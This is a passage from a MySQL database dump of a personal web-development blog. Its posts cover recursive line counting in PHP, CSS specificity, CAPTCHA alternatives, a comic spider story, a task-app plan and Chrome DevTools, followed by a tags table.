\r\nfunction countLinesInDir($dir, $file_exts = array(), $ex_dirs = array()) {	\r\n    if(in_array($dir, $ex_dirs)) return 0;\r\n	\r\n    $total = 0;\r\n    $dirs = readDirectories($dir);\r\n    $files = readFiles($dir);\r\n	\r\n    foreach($dirs as $d) {\r\n        $total += countLinesInDir($d, $file_exts, $ex_dirs);\r\n    }\r\n	\r\n    foreach($files as $f) {\r\n        $ext = strtolower(end(explode(\\''.\\'', $f)));\r\n		\r\n        if(in_array($ext, $file_exts)) {\r\n            $total += count(file($f));\r\n        }\r\n    }\r\n	\r\n    return $total;\r\n}\r\n</pre>\r\n<p>The function above takes three arguments:</p>\r\n<ul>\r\n<li>$dir (the directory path),&nbsp;</li>\r\n<li>$file_exts (an array containing file extensions of files from which we\\''ll count lines in), and&nbsp;</li>\r\n<li>$ex_dirs (an array containing names of directories we may want excluded from the total count).</li>\r\n</ul>\r\n<p>The function first looks to see if the supplied directory is in our excluded directories array, if it is we return with 0 lines read. &nbsp;If the directory is not excluded, we move on to count the total number of lines. &nbsp;As you can see, this function loops through each directory (contained in $dirs) and calls itself to find all the sub-directories and files in that directory. &nbsp;This is known as recursion and it\\''s an easy way to solve big problems! &nbsp;The function moves on to count all the lines of each file it finds in each directory as well. &nbsp;Each time the function calls itself, it returns a total and that number is added to the overall total number of lines (which resides in the initial call to the countLinesInDir() function). &nbsp;Once all recursive calls are returned and lines are counted, the function will return the overall total which should be pretty close to the total number of lines in your web application!</p>\r\n<script type=\\"text/javascript\\">// <![CDATA[\r\nprettyPrint();\r\n// ]]></script>', '2011-06-15 14:07:39', '2011-06-16 16:40:14'),
(80, 'A Primer to CSS Specificity', 'Learn what CSS Specificity means in the context of your webpages', '<p>CSS Specificity is the weight (and value) a web browser gives to a particular CSS rule. &nbsp;Browsers give preference to rules which have a higher weight (the fatter the better!). &nbsp;Rules that have a higher weight will overwrite rules that have a lower weight. &nbsp;Let\\''s take a look at a simple example below.</p>\r\n<h2>A Simple Example of CSS Specificity</h2>\r\n<pre class=\\"prettyprint\\">div {\r\n    background: #0000FF; /** blue */\r\n    height: 100px;\r\n    width: 100px;\r\n}\r\n\r\ndiv.red {\r\n   background: #FF0000; /** red */\r\n}\r\n</pre>\r\n<p>In the code above there are two CSS rules defined: one for div (all divs in fact!) and another for divs that have a class of \\''red\\''. When applied to a web page, all divs on the page would have a width and height of 100px (a square!) and a background of blue. However, any divs on the page that have a class of \\''red\\'' would have a red background instead of blue. Why? Because the divs that have a class of \\''red\\'' have a higher CSS specificity (more weight = more specific = more lovin\\'' by the browser!).</p>\r\n<h2>How To Calculate The Weight of a CSS Rule</h2>\r\n<p>This actually isn\\''t too bad to remember, and to be honest, I have never had to calculate the weight of any of my rules to see if there was a problem on my page, I have a trick to that which you can read about below, but before we get there, let\\''s cover how to calculate the weight:</p>\r\n<ul>\r\n<li>1000 points for inline styles</li>\r\n<li>100 points for IDs (i.e. #myDiv)</li>\r\n<li>10 points for Classes (i.e. div.red), attributes (i.e. input[type=\\''text\\'']) and pseudo-classes (i.e. :hover, :focus, etc)</li>\r\n<li>1 point for Elements (i.e. p, div, etc) and pseudo-elements (i.e. :before and :after)</li>\r\n<li>0 points for universal selectors (i.e. *, body *)</li>\r\n</ul>\r\n<p>So in our example above, the first rule would have a weight of 1 (just one element specified). The second rule would have a rule of 11: one element (+1) and one class (+10). Let\\''s move on to a crazier example by expanding from our first example above.</p>\r\n<h2>A Fatty CSS Specificity Example</h2>\r\n<pre class=\\"prettyprint\\">div {\r\n    background: #0000FF; /** blue */\r\n    height: 100px;\r\n    width: 100px;\r\n}\r\n\r\ndiv.red {\r\n   background: #FF0000; /** red */\r\n}\r\n\r\ndiv#green.red {\r\n    background: #00FF00; /** green */\r\n}\r\n\r\ndiv#green.red:hover {\r\n    background: #FFFFFF; /** white */\r\n}\r\n</pre>\r\n<p>Is this getting confusing yet? Don\\''t worry! That\\''s why you are reading this article! I\\''ll help you understand. Using our definitions above for calculating weight, we can easily calculate the third CSS rule:</p>\r\n<ul>\r\n<li>one element (+1),</li>\r\n<li>one ID (+100),</li>\r\n<li>and one class (+10)</li>\r\n<li>equals 111!</li>\r\n</ul>\r\n<p>So the third rule overwrites the first and second rules, but ONLY THE ATTRIBUTES IN COMMON ARE OVERWRITTEN! This means that since the 1st, 2nd and 3rd CSS rules all have background specified, the second rule overwrites the background in the 1st rule, and the 3rd rule overwrites the background in the 2nd rule.</p>\r\n<p>Can you calculate what the weight of the 4th rule is? When you\\''ve got your answer, highlight the text in the following black block:</p>\r\n<div style=\\"background: #000000; color: #000000;\\">121</div>\r\n<p>Getting the hang of this yet? Ok, let\\''s look at an example where two rules could match the same element and have equal weight.</p>\r\n<h2>How Browsers Handle Two or More Rules with Equal Specificity</h2>\r\n<pre class=\\"prettyprint\\">input[type=\\''text\\''] { /** weight of 11 */\r\n    background: #FFFFFF; /** white */\r\n}\r\n\r\ninput.text { /** weight of 11 */\r\n    background: #FFF000; /** yellow */\r\n}\r\n</pre>\r\n<p>&nbsp;</p>\r\n<pre class=\\"prettyprint\\">&lt;input type=\\"text\\" class=\\"text\\" value=\\"What is my Background Color?\\" size=\\"50\\" /&gt;\r\n</pre>\r\n<p>In the example above, both rules have equal CSS Specificity, so which rule does the browser give preference to? It\\''s the 2nd rule because it is defined AFTER the first rule. So the background of the input element would be yellow, not white.</p>\r\n<h2>Don\\''t Get Tricked by CSS Specificity!</h2>\r\n<p>The more weight a CSS rule has, the more preference it is given by the browser. Typically, rules can be overwritten when defined after earlier rules that match the same element(s). However, if the specificity of an earlier rule is greater than the specificity of a later rule, the browser gives preference to the one with a higher weight over the one defined later on (lower in the file). Here\\''s an example:</p>\r\n<pre class=\\"prettyprint\\">input[type=\\''text\\''] { /** weight of 11 */\r\n    background: #FFFFFF; /** white */\r\n}\r\n\r\n.text { /** weight of 10 */\r\n    background: #FFF000; /** yellow */\r\n}\r\n</pre>\r\n<pre class=\\"prettyprint\\">&lt;input type=\\"text\\" class=\\"text\\" value=\\"What is my Background Color?\\" size=\\"50\\" /&gt;\r\n</pre>\r\n<p>You might think that the text field would have a yellow background here, but in fact, it will be white because the 1st rule has a higher weight!</p>\r\n<h2>The Trick to CSS Specificity</h2>\r\n<p>All you need to remember is this: the more specific your CSS rule, the more weight it will have, and the more preference it will be given by the browser. This is especially true for cascading.</p>\r\n<h2>CSS Specificity in Cascading</h2>\r\n<p>Cascading is the same as selecting descendants. In the example below, an anchor tag is specified to have white text in a div with a blue background, like this:</p>\r\n<pre class=\\"prettyprint\\">a { /** weight of 1 */\r\n    color: #000000; /** black */\r\n}\r\n\r\ndiv.blue { /** weight of 11 */\r\n    background: #0000FF;\r\n}\r\n\r\ndiv.blue a { /** weight of 12 */\r\n    color: #FFFFFF;\r\n}\r\n</pre>\r\n<p>You might think the text in the anchor tag in the following code sample would be black, but it\\''s actually going to be white. That\\''s because the 3rd rule defined in the example above has more weight than the 1st rule.</p>\r\n<pre class=\\"prettyprint\\">&lt;div class=\\"blue\\"&gt;\r\n    &lt;a href=\\"#\\"&gt;What color is this example text?&lt;/a&gt;\r\n&lt;/div&gt;\r\n</pre>\r\n<h2>Key Points of CSS Specificity</h2>\r\n<ul>\r\n<li>CSS Specificity is the weight (a value) given to a particular CSS rule and is how browsers determine which rules are applied to the HTML document.</li>\r\n<li>Every element has a weight!</li>\r\n<li>The more specific your rule (or selector) is, the more weight it has, and the more apt it is to overwrite earlier rules that match the same element.</li>\r\n<li>Even if defined earlier in the file, a CSS rule with more weight will overwrite a CSS rule with less weight matching the same element and defined later on (lower) in the file.</li>\r\n<li>When two rules match the same element and have the same weight, the rule defined later is given preference by the browser.</li>\r\n</ul>\r\n<h2>Learn More About CSS Specificity</h2>\r\n<ul>\r\n<li><a href=\\"http://coding.smashingmagazine.com/2007/07/27/css-specificity-things-you-should-know/\\">Things You Should Know About CSS Specificity</a></li>\r\n<li><a href=\\"http://css-tricks.com/855-specifics-on-css-specificity/\\">Specifics on CSS Specificity</a></li>\r\n</ul>\r\n<script type=\\"text/javascript\\">// <![CDATA[\r\n$(document).ready(function() {\r\n    prettyPrint();\r\n});\r\n// ]]></script>', '2011-08-16 21:27:01', '2011-08-17 12:16:32'),
(82, 'Alternatives to CAPTCHA Slides', 'Alternatives to CAPTCHA', '<p>I put this together for a Lunch n\\'' Learn talk I am presenting today at work. It is based off a blog post I wrote a while back on <a href=\\"../Blog/Alternatives-to-CAPTCHA\\">Alternatives to CAPTCHA</a>. Enjoy. :) <br /><br /> <iframe src=\\"https://docs.google.com/presentation/embed?id=1FiqxkhhAKEVa3illIa4Sh27yn4-WB0vRypalVVsL148&amp;start=false&amp;loop=false&amp;delayms=3000\\" frameborder=\\"0\\" width=\\"480\\" height=\\"389\\"></iframe></p>\r\n<p>&nbsp;</p>\r\n<p>To view the full-screen presentation: <a href=\\"https://docs.google.com/presentation/d/1FiqxkhhAKEVa3illIa4Sh27yn4-WB0vRypalVVsL148/present#slide=id.p\\" target=\\"_blank\\">Click Here</a>.</p>', '2012-03-29 08:46:31', '2012-03-29 12:51:53'),
(83, 'Spiderzilla', 'The famous spiderzilla story', '<p>So,</p>\r\n<p><br /><span>By special request, I have decided to re-tell the Spiderzilla story. But I must warn you... I will not be held responsible for any injuries that you or someone else may incur upon reading this post!! It is scary,&nbsp;</span><strong>very</strong><span>&nbsp;scary! Please Mothers, cover your children\\''s eyes...</span><br /><br /><span>It was a normal night, or so I thought, and I was peckish. I walk into the kitchen whilst thinking about what I might eat tonight. Would it be pizza rolls? Perhaps a sammich? Maybe I\\''ll make some spaghetti, I thought. As I reached into the pantry to turn the light on via the clever string hanging down from a&nbsp;</span><a href=\\"http://en.wikipedia.org/wiki/Thomas_Edison\\"><span style=\\"color: #445566;\\">Thomas Edison</span></a><span>&nbsp;invention, there it was... one, two, ...four, omg...6, sh*t, EIGHT LEGS... It\\''s A SPIDER!!! Located and attached at the wall to my immediate right! I quickly teleport into the next room, that\\''s right... I teleported because that is much quicker than running!! Well actually, it\\''s the same thing as running, but really&nbsp;</span><strong>really</strong><span>&nbsp;fast!</span><br /><br /><span>Let\\''s&nbsp;</span><span><strong>pause</strong></span><span>&nbsp;for a moment...</span><br /><br /><span>I must tell you, this spider was no&nbsp;</span><strong>ordinary</strong><span>&nbsp;spider. In fact, it was the&nbsp;</span><strong>biggest&nbsp;</strong><span>spider I had ever seen in my 23 year lifetime. Furthermore, the location of this particular spider suggests that its brain is in fact larger than mine. For this particular, yet clever, yet strategic spider had made the most successful attempt at my life in the history of spider attacks in which I have successfully evaded! Don\\''t you see?? It\\''s GUARDING my food! Even worse, and the part that suggests its level of intellect, is that this spider has strategically positioned himself on the wall located near my food and inside my pantry at the exact moment in time that I would be hungry!!! But the next part is far worse...</span><br /><br /><span>The&nbsp;</span><strong>next&nbsp;</strong><span>part:</span><br /><span>I had decided that the only possible way for me to get past the spider, was to come up with a gadget that would trap the spider whilst keeping me at least 7 feet away. So I found a pole, a box, and duct tape. Thank God! I thought I was saved, I was already tasting the saucy spaghetti down my throat.&nbsp;</span><br /><br /><span>As I tip-toed back inside the kitchen, or war-zone, I quickly took a peak into the pantry and teleported back into the other room. Then, I browsed the images in my short-term memory, and found food, spaghetti, string, a wall, and... and OH MY GOD... there was NO SPIDER!</span><br /><br /><span>I know what you are thinking... \\"Great it\\''s gone! You can eat food!!\\" No, that is entirely what Spiderzilla wishes me to think. We must remember that this spider had once strategically placed itself on the wall in my pantry where all my food is kept at the exact moment in time that I was hungry!! This is an intelligent spider folks!!! We can\\''t just jump to conclusions and</span><strong>assume</strong><span>&nbsp;it\\''s gone!&nbsp;</span><br /><br /><span>If ever I lose sight of a spider, the entire zone in which the spider was last seen must be searched (with dustpan and spider-killer in hands) at every inch, and then... an entire investigation must be completed on the possible locations that the spider could have fled to.&nbsp;</span><br /><br /><span>This spider, yes this clever spider, had fled to a spot where no pole or box could get to. Even worse, I could not spray any spider killer at it or I would risk contaminating my food. Do you now understand the seriousness of this matter and the sheer power of intellect that this spider, yes Spiderzilla, holds???&nbsp;</span><br /><br /><span>Spiderzilla had completely taken over my pantry, for I could not enter it without surely being attacked and probably murdered. But, I don\\''t think this spider wants to kill me directly. It wants me to suffer a slow, painful death. That\\''s right, I was to starve.&nbsp;</span><br /><br /><span>Luckily, this spider had no idea that I had access to an exit from the apartment, yes my door, and keys to a car that would take me to a restaurant where I might obtain food!</span><br /><br /><span>Keyword:&nbsp;</span><strong>might.</strong><br /><br /><span>I got to the restaurant, and in all the rush... forgot my wallet. I bet you anything, Spiderzilla knew.</span><br /><br /><span>To conclude a long story, Spiderzilla still remains alive and well, and as far as I know...in hiding. It is waiting for the right time, again. I fear one day it may be successful.</span></p>', '2012-05-07 13:59:46', '2012-05-07 18:00:11'),
(84, 'New Project: OnTask', 'Started working on creating a new task management application - OnTask', '<p>Started development on a new Task Management Application this weekend - I have dubbed it \\"<strong>OnTask</strong>\\". &nbsp;Catchy, right? My objectives in developing this system are:</p>\r\n<ul>\r\n<li>Ease of creating tasks</li>\r\n<li>Being able to assign tasks to one or more people</li>\r\n<li>Getting notified by email or text message (both are optional in user account settings) when a task is assigned to you or when your task is updated</li>\r\n<li>Multiple lists</li>\r\n<li>List and Calendar viewing of tasks</li>\r\n<li>Upload files to tasks</li>\r\n<li>Mobile Application for syncing tasks between devices</li>\r\n<li>Meeting Tracker - I like to see and be notified when meetings are upcoming</li>\r\n<li>Integration with Outlook/Gmail/etc</li>\r\n<li>Ability to prioritize tasks</li>\r\n<li>Ability to print tasks (neatly!)</li>\r\n<li>Recurring Tasks</li>\r\n</ul>\r\n<p>If I can accomplish all of the above, I really think I\\''ll have a nice application on my hands that will help me keep track of not only the work I need to do, but also the work I have my slaves doing!&nbsp;</p>\r\n<p>It\\''s gonna be goooooooooooooooooooood, just you wait and see!&nbsp;</p>', '2012-05-20 19:24:22', '2012-05-20 23:24:50'),
(85, 'Optimization is King', 'Speed up your website and get found by search engines', '<p>Thought I\\''d share this Google Docs presentation I created a while ago for a Lunch and Learn at the company I am currently working with. &nbsp;This presentation talks about the different ways to speed up your website and how to get noticed in search engines.</p>\r\n<p><iframe src=\\"https://docs.google.com/presentation/embed?id=1otbXD4mXJPO0KCFhmYTwJhYDKZ6iHnljDZmYQzZTUVE&amp;start=false&amp;loop=false&amp;delayms=3000\\" frameborder=\\"0\\" width=\\"480\\" height=\\"389\\"></iframe></p>', '2012-12-03 21:41:15', '2012-12-04 02:41:43'),
(86, 'Chrome Developer Tools', 'All about Chrome Developer Tools, how to use them and some nice tricks', '<p>I just did a Lunch &amp; Learn presentation on Chrome Developer tools last week and used the video and accompanying slides as a reference. &nbsp;This is really an excellent video that covers all the really great things you can do with Google Chrome\\''s Developer Tools. &nbsp;It\\''s dated from Google IO Developer Conference held in 2011, but it\\''s still great!</p>\r\n<p>Slides:</p>\r\n<p><a href=\\"http://chrome-devtools-io2011.appspot.com/template/index.html#1\\" target=\\"_blank\\">http://chrome-devtools-io2011.appspot.com/template/index.html#1</a></p>\r\n<p>&nbsp;</p>\r\n<p><iframe src=\\"http://www.youtube.com/embed/N8SS-rUEZPg?feature=player_detailpage\\" frameborder=\\"0\\" width=\\"640\\" height=\\"360\\"></iframe></p>', '2012-12-10 19:07:26', '2012-12-11 00:07:26');

-- --------------------------------------------------------

--
-- Table structure for table `js_tags`
--

CREATE TABLE IF NOT EXISTS `js_tags` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(25) NOT NULL DEFAULT '',
  `reference` int(11) NOT NULL DEFAULT '0',
  `tag` varchar(25) NOT NULL DEFAULT '',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `owner` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `type` (`type`,`reference`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=37 ;

--
-- Dumping data for table `js_tags`
--

INSERT INTO `js_tags` (`id`, `type`, `reference`, `tag`, `created`, `modified`, `owner`) VALUES
(1, 'BlogPost', 66, 'PHP', '2011-06-16 07:35:20', '2014-08-17 19:02:17', 1),
(2, 'BlogPost', 79, 'PHP', '2011-06-16 07:36:23', '2014-08-17 19:02:17', 1),
(3, 'BlogPost', 78, 'PHP', '2011-06-16 07:36:23', '2014-08-17 19:02:17', 1),
(4, 'BlogPost', 75, 'PHP', '2011-06-16 07:36:23', '2014-08-17 19:02:17', 1),
(5, 'BlogPost', 78, 'Security', '2011-06-16 07:36:39', '2014-08-17 19:02:17', 1),
(6, 'BlogPost', 78, 'XSS', '2011-06-16 07:36:39', '2014-08-17 19:02:17', 1),
(7, 'BlogPost', 76, 'JavaScript', '2011-06-16 07:37:18', '2014-08-17 19:02:17', 1),
(8, 'BlogPost', 74, 'JavaScript', '2011-06-16 07:37:19', '2014-08-17 19:02:17', 1),
(9, 'BlogPost', 73, 'JavaScript', '2011-06-16 07:37:19', '2014-08-17 19:02:17', 1),
(10, 'BlogPost', 70, 'Apache', '2011-06-16 07:38:11', '2014-08-17 19:02:17', 1),
(11, 'BlogPost', 70, 'MOD_REWRITE', '2011-06-16 07:38:11', '2014-08-17 19:02:17', 1),
(12, 'BlogPost', 69, 'jQuery', '2011-06-16 07:38:44', '2014-08-17 19:02:17', 1),
(13, 'BlogPost', 69, 'PHP', '2011-06-16 07:38:44', '2014-08-17 19:02:17', 1),
(14, 'BlogPost', 69, 'JavaScript', '2011-06-16 07:38:44', '2014-08-17 19:02:17', 1),
(15, 'BlogPost', 69, 'CSS', '2011-06-16 07:38:44', '2014-08-17 19:02:17', 1),
(16, 'BlogPost', 68, 'CAPTCHA', '2011-06-16 07:39:01', '2014-08-17 19:02:17', 1),
(17, 'BlogPost', 68, 'Security', '2011-06-16 07:39:01', '2014-08-17 19:02:17', 1),
(18, 'BlogPost', 68, 'JavaScript', '2011-06-16 07:39:21', '2014-08-17 19:02:17', 1),
(19, 'BlogPost', 68, 'CSS', '2011-06-16 07:39:21', '2014-08-17 19:02:17', 1),
(20, 'BlogPost', 67, 'SEO', '2011-06-16 07:39:30', '2014-08-17 19:02:17', 1),
(21, 'BlogPost', 65, 'SEO', '2011-06-16 07:39:30', '2014-08-17 19:02:17', 1),
(22, 'BlogPost', 72, 'Apps', '2011-06-16 07:39:51', '2014-08-17 19:02:17', 1),
(23, 'BlogPost', 72, 'CSS', '2011-06-16 07:39:51', '2014-08-17 19:02:17', 1),
(24, 'BlogPost', 77, 'jQuery', '2011-06-16 07:40:06', '2014-08-17 19:02:17', 1),
(25, 'BlogPost', 77, 'AJAX', '2011-06-16 07:40:06', '2014-08-17 19:02:17', 1),
(26, 'BlogPost', 77, 'JavaScript', '2011-06-16 07:40:06', '2014-08-17 19:02:17', 1),
(27, 'BlogPost', 77, 'PHP', '2011-06-16 07:40:26', '2014-08-17 19:02:17', 1),
(28, 'BlogPost', 80, 'CSS', '2011-08-16 21:27:01', '2014-08-17 19:02:17', 1),
(30, 'BlogPost', 82, 'CAPTCHA', '2012-03-29 08:46:31', '2014-08-17 19:02:17', 1),
(31, 'BlogPost', 83, 'Spiders', '2012-05-07 13:59:46', '2014-08-17 19:02:17', 1),
(32, 'BlogPost', 84, 'Apps', '2012-05-20 19:24:22', '2014-08-17 19:02:17', 1),
(33, 'BlogPost', 85, 'Optimization', '2012-12-03 21:41:15', '2014-08-17 19:02:17', 1),
(34, 'BlogPost', 85, 'SEO', '2012-12-03 21:41:15', '2014-08-17 19:02:17', 1),
(35, 'BlogPost', 86, 'Chrome', '2012-12-10 19:07:26', '2014-08-17 19:02:17', 1),
(36, 'BlogPost', 86, 'Tools', '2012-12-10 19:07:26', '2014-08-17 19:02:17', 1);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
